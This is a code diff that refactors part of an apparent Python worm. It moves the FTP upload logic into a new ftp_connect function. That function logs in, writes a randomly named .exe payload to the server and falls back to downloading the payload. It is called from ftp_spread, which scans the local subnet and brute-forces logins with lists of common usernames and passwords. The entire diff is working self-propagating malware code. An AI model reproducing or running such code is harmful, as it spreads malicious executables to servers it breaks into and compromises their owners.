@@ -205,9 +205,23 @@ def download_payload():
     except:
         return None
 
+def ftp_connect(ip, user, pwd, anonymous=False):
+    global PAYLOAD_PATH
+    try:
+        ftp = ftplib.FTP(ip, timeout=2)
+        ftp.login(user, pwd)
+        random_name = f'{generate_random_name()}.exe'
+        if PAYLOAD_PATH and os.path.exists(PAYLOAD_PATH): payload_path = PAYLOAD_PATH
+        else: payload_path = download_payload()
+        if payload_path:
+            with open(payload_path, 'rb') as f:
+                ftp.storbinary(f'STOR {random_name}', f)
+        ftp.quit()
+        return True
+    except: return False
+
 # FTP propagation to subnet servers
 def ftp_spread(common_users, common_pass):
-    global PAYLOAD_PATH
     try:
         local_ip = socket.gethostbyname(socket.gethostname()).rsplit('.', 1)[0]
         for i in range(1, 255):
@@ -215,23 +229,11 @@ def ftp_spread(common_users, common_pass):
             done = False
             for user in common_users:
                 if done: break
-                done = False
                 for pwd in common_pass:
-                    try:
-                        print(f"Trying for ip: {ip} with user: {user}, pass: {pwd}")
-                        ftp = ftplib.FTP(ip, timeout=2)
-                        ftp.login(user, pwd)
-                        random_name = f'{generate_random_name()}.exe'
-                        if PAYLOAD_PATH and os.path.exists(PAYLOAD_PATH): payload_path = PAYLOAD_PATH
-                        else: payload_path = download_payload()
-                        if payload_path:
-                            with open(payload_path, 'rb') as f:
-                                ftp.storbinary(f'STOR {random_name}', f)
-                        ftp.quit()
-                        print(f"DONE Sending file for user: {user}, ip: {ip}")
-                        done = True
-                        break 
-                    except: continue
+                    print(f"Trying for ip: {ip} with user: {user}, pass: {pwd}")
+                    done = ftp_connect(ip, user, pwd)
+                    print(f"DONE Sending file for user: {user}, ip: {ip}")
+                    if done: break 
             if not done:
                 try:
                     print(f"Trying for ip: {ip} as anonymous user")
